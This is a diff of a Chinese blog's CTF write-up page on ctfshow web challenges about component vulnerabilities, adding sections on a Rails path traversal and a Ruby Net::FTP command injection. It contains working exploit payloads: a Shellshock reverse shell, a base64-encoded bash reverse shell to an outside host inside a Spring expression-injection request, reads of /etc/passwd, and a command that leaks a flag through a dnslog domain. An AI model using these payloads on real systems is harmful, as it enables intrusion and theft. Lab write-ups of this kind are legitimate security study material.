@@ -23,12 +23,12 @@
   <meta name="author" content="dr0n">
   <meta name="keywords" content="">
   
-    <meta name="description" content="WEB580–WEB599   WEB580根据题目所给的提示“破壳”，那么应该是Shellshock 破壳漏洞（CVE-2014-6271）这一题试了很多种payload，除了能看&#x2F;etc&#x2F;passwd，其他都没有回显或返回500，无奈只能反弹shell（还是太菜了）payload：() &amp;#123; :; &amp;#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;d">
+    <meta name="description" content="WEB580–WEB599   WEB580根据题目所给的提示“破壳”，那么应该是Shellshock 破壳漏洞（CVE-2014-6271）这一题试了很多种payload，除了能看&#x2F;etc&#x2F;passwd，其他都没有回显或返回500，无奈只能反弹shell（还是太菜了）payload：() &#123; :; &#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;d">
 <meta property="og:type" content="article">
 <meta property="og:title" content="【ctfshow】web入门-组件漏洞">
 <meta property="og:url" content="https://www.dr0n.top/posts/605e5ac9/index.html">
 <meta property="og:site_name" content="Dr0n&#39;s blog">
-<meta property="og:description" content="WEB580–WEB599   WEB580根据题目所给的提示“破壳”，那么应该是Shellshock 破壳漏洞（CVE-2014-6271）这一题试了很多种payload，除了能看&#x2F;etc&#x2F;passwd，其他都没有回显或返回500，无奈只能反弹shell（还是太菜了）payload：() &amp;#123; :; &amp;#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;d">
+<meta property="og:description" content="WEB580–WEB599   WEB580根据题目所给的提示“破壳”，那么应该是Shellshock 破壳漏洞（CVE-2014-6271）这一题试了很多种payload，除了能看&#x2F;etc&#x2F;passwd，其他都没有回显或返回500，无奈只能反弹shell（还是太菜了）payload：() &#123; :; &#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;d">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://www.dr0n.top/img/ctfshow/web%E5%85%A5%E9%97%A8/%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E.png">
 <meta property="og:image" content="https://www.dr0n.top/img/ctfshow/web%E5%85%A5%E9%97%A8/web580-1.png">
@@ -67,6 +67,10 @@
 <meta property="og:image" content="https://www.dr0n.top/img/ctfshow/web%E5%85%A5%E9%97%A8/web596-1.png">
 <meta property="og:image" content="https://www.dr0n.top/img/ctfshow/web%E5%85%A5%E9%97%A8/web597-1.png">
 <meta property="og:image" content="https://www.dr0n.top/img/ctfshow/web%E5%85%A5%E9%97%A8/web597-2.png">
+<meta property="og:image" content="https://www.dr0n.top/img/ctfshow/web%E5%85%A5%E9%97%A8/web598-1.png">
+<meta property="og:image" content="https://www.dr0n.top/img/ctfshow/web%E5%85%A5%E9%97%A8/web599-1.png">
+<meta property="og:image" content="https://www.dr0n.top/img/ctfshow/web%E5%85%A5%E9%97%A8/web599-2.png">
+<meta property="og:image" content="https://www.dr0n.top/img/ctfshow/web%E5%85%A5%E9%97%A8/web599-3.png">
 <meta property="article:published_time" content="2021-06-18T08:36:00.000Z">
 <meta property="article:modified_time" content="2025-07-27T09:45:59.766Z">
 <meta property="article:author" content="dr0n">
@@ -168,7 +172,7 @@
 
 
   
-<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
 </head>
 
 
@@ -368,7 +372,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.7k 字
+          3k 字
         
       </span>
     
@@ -379,7 +383,7 @@
         
         
         
-          28 分钟
+          30 分钟
         
       </span>
     
@@ -450,7 +454,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9jbjEudXRvb2xzLmNsdWIvNDUyMTQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br>bytecode = <span class="hljs-string">&#x27;,&#x27;</span>.join(<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(payload))<br><span class="hljs-built_in">print</span>(bytecode)<br></code></pre></td></tr></table></figure>
 
 <p>payload</p>
-<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">[&#123; <span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-type"></span>&quot;replace<span class="hljs-string">&quot;, &quot;</span>path<span class="hljs-string">&quot;: &quot;</span>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-type">java</span>.lang.<span class="hljs-keyword">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[]&#123;生成的数字&#125;))/lastname<span class="hljs-string">&quot;, &quot;</span>value<span class="hljs-string">&quot;: &quot;</span>ctfshow<span class="hljs-string">&quot; &#125;]</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">[&#123; <span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-type"></span>&quot;replace<span class="hljs-string">&quot;, &quot;</span>path<span class="hljs-string">&quot;: &quot;</span>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-keyword">new</span><span class="hljs-type"></span> java.lang.<span class="hljs-keyword">String</span>(<span class="hljs-keyword">new</span><span class="hljs-type"></span> byte[]&#123;生成的数字&#125;))/lastname<span class="hljs-string">&quot;, &quot;</span>value<span class="hljs-string">&quot;: &quot;</span>ctfshow<span class="hljs-string">&quot; &#125;]</span><br></code></pre></td></tr></table></figure>
 <p>首先post &#x2F;api&#x2F;people新建一个用户,获取到id<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web584-1.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后通过PATCH &#x2F;api&#x2F;people&#x2F;1，可以rce反弹shell<br><strong>注意Content-Type的格式</strong></p>
 <p><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web584-2.png" srcset="/img/loading.gif" lazyload><br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web584-3.png" srcset="/img/loading.gif" lazyload></p>
@@ -492,7 +496,13 @@
 <p>Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e&#x2F;来跨越到根目录，读取或执行目标服务器上任意文件。</p>
 <p>直接访问IP&#x2F;assets&#x2F;file:%2f%2f&#x2F;etc&#x2F;passwd，将会报错，因为文件&#x2F;etc&#x2F;passwd不在允许的目录中：<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web597-1.png" srcset="/img/loading.gif" lazyload><br>在上方的报错中随意选择一个路径利用..&#x2F;返回上一级，成功实现任意文件读取<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web597-2.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="WEB598"><a href="#WEB598" class="headerlink" title="WEB598"></a>WEB598</h1><p>Ruby on Rails 路径穿越与任意文件读取漏洞（CVE-2019-5418）</p>
-<p>在控制器中通过render file形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。我们通过传入&#96;Accept: ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>
+<p>在控制器中通过render file形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。我们通过传入<code>Accept: ../../../../../../../../etc/passwd&#123;&#123;</code>头来构成构造路径穿越漏洞，读取任意文件。</p>
+<p>访问&#x2F;robots并抓包传入Accept<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web598-1.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="WEB599"><a href="#WEB599" class="headerlink" title="WEB599"></a>WEB599</h1><p>Ruby Net::FTP 模块命令注入漏洞（CVE-2017-17405）<br>这一题做的时间比较久，一直反弹不出来，最后向bit师傅学到了一个新的姿势</p>
+<p>因为这是一个FTP客户端的漏洞，所以我们需要先运行一个可以被访问到的服务端。比如使用python：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 安装pyftpdlib</span><br><span class="hljs-attribute">pip</span> install pyftpdlib<br><br><span class="hljs-comment"># 在当前目录下启动一个ftp服务器，默认监听在`0.0.0.0:2121`端口</span><br><span class="hljs-attribute">python3</span> -m pyftpdlib -p <span class="hljs-number">2121</span> -i <span class="hljs-number">0.0.0.0</span><br></code></pre></td></tr></table></figure>
+<p><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web599-1.png" srcset="/img/loading.gif" lazyload><br>然后即可开始利用漏洞。发送如下数据包即可（填上你的FTP服务器的ip和端口，空格要用${IFS}代替，使用前先在<a target="_blank" rel="noopener" href="http://dnslog.cn/">dnslog.cn</a>创建一个子域名用来接收数据(替换下面的子域名)）：</p>
+<p><code>IP/download?uri=ftp://FTPIP:FTPPORT/&amp;file=|ping$&#123;IFS&#125;$FLAG.qfy4pq.dnslog.cn$&#123;IFS&#125;-c$&#123;IFS&#125;2</code><br>观察ftp服务器，收到数据包<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web599-2.png" srcset="/img/loading.gif" lazyload><br>dnslog收到数据<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web599-3.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
